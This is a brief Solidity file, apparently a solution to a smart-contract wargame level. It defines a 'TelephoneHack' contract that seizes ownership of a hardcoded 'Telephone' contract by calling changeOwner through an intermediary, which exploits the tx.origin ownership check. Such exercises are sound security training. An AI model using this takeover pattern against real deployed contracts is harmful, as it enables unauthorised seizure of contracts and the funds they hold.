// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Telephone {

  address public owner;

  constructor() {

  }

  function changeOwner(address _owner) public { }
}

contract TelephoneHack {

    address public glb_addr = 0xB4eDA138eF570a132Abeb9B9e44d51a07eB119E3;
    address public glb_addr_2;
    Telephone tele = Telephone(glb_addr);
    
    constructor(address temp_addr){
        glb_addr_2 = temp_addr;
    }
    function becomeOwner() public {
            
        // console.log("Trying Becoming Owner");
        tele.changeOwner(glb_addr_2);
        // console.log("Done Becoming Owner");

    }
}